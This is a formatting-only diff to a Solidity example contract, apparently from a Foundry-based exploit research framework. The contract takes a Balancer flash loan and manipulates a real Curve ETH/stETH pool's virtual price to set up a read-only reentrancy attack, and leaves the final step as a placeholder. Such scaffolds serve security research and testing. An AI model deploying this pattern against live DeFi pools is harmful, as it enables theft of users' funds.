@@ -15,12 +15,14 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
 
     function initiateAttack() external {
         console.log("---------------------------------------------------------------------------");
-        console.log("Curve Virtual Price BEFORE:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
+        console.log(
+            "Curve Virtual Price BEFORE:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price()
+        );
         // Deal ether to cover fees and losses
         deal(EthereumTokens.NATIVE_ASSET, address(this), 3.5 ether);
         takeFlashLoan(FlashLoanProviders.BALANCER, EthereumTokens.WETH, 50000e18);
-
     }
+
     function _executeAttack() internal override(PriceManipulation, FlashLoan) {
         if (currentFlashLoanProvider() == FlashLoanProviders.EULER) {
             // Unwrap flash loaned wstETH to manipulate Curve pool
@@ -29,8 +31,10 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
             console.log("ETH   :", address(this).balance);
             console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
 
-            manipulatePrice(PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18);
-            
+            manipulatePrice(
+                PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18
+            );
+
             console.log("---------------------------------------------------------------------------");
             console.log("Pay back stETH flash loan");
             console.log("ETH   :", address(this).balance);
@@ -76,7 +80,9 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
             // Execute read only reentrancy
             // Caller should be curve pool
             console.log("---------------------------------------------------------------------------");
-            console.log("Curve Virtual Price DURING:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
+            console.log(
+                "Curve Virtual Price DURING:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price()
+            );
             console.log("ETH   :", address(this).balance);
             console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
             console.log("Execute price manipulation attack HERE");
@@ -97,6 +103,7 @@ interface IWrapped {
     function wrap(uint256) external;
     function unwrap(uint256) external;
 }
+
 interface IWrappedEther {
     function deposit() external payable;
     function withdraw(uint256) external;
@@ -105,12 +112,27 @@ interface IWrappedEther {
 interface UniswapV2Router02 {
     function factory() external pure returns (address);
     function WETH() external pure returns (address);
-    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+    function swapExactTokensForETH(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
         external
-        returns (uint[] memory amounts);
-    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
-    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
-    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
-    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
-
+        pure
+        returns (uint256 amountOut);
+    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
+        external
+        pure
+        returns (uint256 amountIn);
+    function getAmountsOut(uint256 amountIn, address[] calldata path)
+        external
+        view
+        returns (uint256[] memory amounts);
+    function getAmountsIn(uint256 amountOut, address[] calldata path)
+        external
+        view
+        returns (uint256[] memory amounts);
 }
